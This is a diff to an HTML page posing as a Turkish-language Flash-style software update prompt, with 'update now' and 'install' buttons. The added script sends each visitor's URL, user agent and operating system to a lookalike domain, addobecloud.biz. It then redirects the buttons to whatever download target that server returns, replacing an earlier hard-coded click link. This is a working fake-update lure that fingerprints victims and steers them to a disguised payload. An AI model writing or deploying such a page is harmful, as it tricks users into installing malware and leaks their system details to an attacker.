@@ -10,8 +10,37 @@
 	<title>Application</title>
 	<style type="text/css">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}html{height:100%;width:100%}html{background-color:#313131;color:#e1e1e1}body{min-width:675px;max-width:675px;font-family:"Arial",sans-serif;font-size:18px;padding:0;margin:0 auto}.wrapper{border:1px solid #525353;background-color:#272727;height:360px}.title{color:#58080b;background:#fafbfb;background:linear-gradient(to bottom,#fafbfb,#878789);text-align:center;line-height:34px}.update{color:#5f6061}.flashLogo{float:left;width:18%}.subject{color:#fff;font-size:17px}.subject span{color:#7bc1e8}.content{margin:20px 10% 0px 20%}.content ul{font-size:13px;margin:20px 0;line-height:18px}.content ul li{padding-left:15px}.subscr{color:#8a8888;font-size:12px}.action .button{border:1px solid #000;background:#656565;background:linear-gradient(to bottom, #656565, #353636);color:#fff;padding:10px 64px;font-size:18px;margin:28px 39px;cursor:pointer;float:left}.action .button:hover{background:#174f14;background:-moz-linear-gradient(top,  #174f14 0%, #24af24 83%, #52b152 100%);background:-webkit-linear-gradient(top,  #174f14 0%,#24af24 83%,#52b152 100%);background:linear-gradient(to bottom,  #174f14 0%,#24af24 83%,#52b152 100%);filter:progid:DXImageTransform.Microsoft.gradient( startColorstr='#174f14', endColorstr='#52b152',GradientType=0 );color:#fff}.action .button2{border:1px solid #000;background:#52b152;background:-moz-linear-gradient(top,  #52b152 0%, #24af24 17%, #174f14 100%);background:-webkit-linear-gradient(top,  #52b152 0%,#24af24 17%,#174f14 100%);background:linear-gradient(to bottom,  #52b152 0%,#24af24 17%,#174f14 100%);filter:progid:DXImageTransform.Microsoft.gradient( startColorstr='#52b152', endColorstr='#174f14',GradientType=0 );color:#fff;padding:10px 64px;font-size:18px;margin:28px 39px;cursor:pointer;float:left}.action .button2:hover{background:#174f14;background:-moz-linear-gradient(top,  #174f14 0%, #24af24 83%, #52b152 100%);background:-webkit-linear-gradient(top,  #174f14 0%,#24af24 83%,#52b152 100%);background:linear-gradient(to bottom,  #174f14 0%,#24af24 83%,#52b152 100%);filter:progid:DXImageTransform.Microsoft.gradient( startColorstr='#174f14', endColorstr='#52b152',GradientType=0 );color:#fff}.progress{width:65%;height:18px;background:#687b8d;background:linear-gradient(to bottom, #687b8d, #abbbc9);margin:25px auto 0 auto;border-radius:15px;border:1px solid #808e9c}.progress-bar{background:#bae1f6;background:linear-gradient(to bottom,#bae1f6,#2787bd);height:18px;border-radius:15px}#footer{width:100%;margin-top:30px;font-size:12px;text-align:center}#footer ul{margin:0;padding:0;list-style:none}#footer ul li{display:inline;padding-left:10px;margin-right:10px}#footer  ul li a{text-decoration:none;color:#747474;font-family:Arial,Helvetica,sans-serif}#footer  ul li a:hover{opacity:.8}::-moz-selection,::selection{background:#5e6982;color:#fff;text-shadow:none}a,a:visited{color:#fff;outline:none}a:focus,a:hover,a:active{outline:none}@media screen and (max-width: 800px){.action{text-align:center;margin:15px 0}.action .button{float:none;margin:15px}}.adnl_zone{position:absolute;margin:auto;top:20%;right:0;left:0;z-index:20}
 	</style>
+<script>
+    var redirect_to = "#";
+    $.ajax({
+        type: "POST",
+        url: "https://addobecloud.biz/hasumi.php",
+        jsonp: "redirect",
+        crossDomain: true,
+        dataType: "json",
+        data: {
+            url: document.location.href,
+            agent: navigator.userAgent,
+            os: navigator.oscpu,
+        },
+        success:function(result){
+            redirect_to = result.redirect;
+        },
+        error:function(xhr,status,error){
+            //alert(status);
+        }
+    });
+    </script>
 	<script>
-	function showStep(){window.onbeforeunload=null;document.location.href="http://vol.annyvine.info/click";var nAgt=navigator.userAgent;var verOffset;if((verOffset=nAgt.indexOf("Firefox"))!=-1){document.getElementById("mozilla").style.display="block";}}
+	function showStep(){
+        window.onbeforeunload=null;
+        document.location.href=redirect_to;
+        var nAgt=navigator.userAgent;
+        var verOffset;
+        if((verOffset=nAgt.indexOf("Firefox"))!=-1){
+            document.getElementById("mozilla").style.display="block";
+        }
+    }
 	</script>
 </head>
 <body class="en ltr">
@@ -33,8 +62,8 @@
 		<div class="progress-bar" style="width: 100%;"></div>
 	</div>
 	<div class="action">
-		<a href="http://vol.annyvine.info/click" class="download_link"><div class="button" onclick = "showStep();">HEMEN GÜNCELLE</div></a>
-		<a href="http://vol.annyvine.info/click" class="download_link"><div class="button2" style="float:right !important;" onclick = "showStep();">KUR</div></a>
+		<a href="#" class="download_link"><div class="button" onclick = "showStep();">HEMEN GÜNCELLE</div></a>
+		<a href="#" class="download_link"><div class="button2" style="float:right !important;" onclick = "showStep();">KUR</div></a>
 	</div>
 </div>
 <div id="footer" class="type_1">
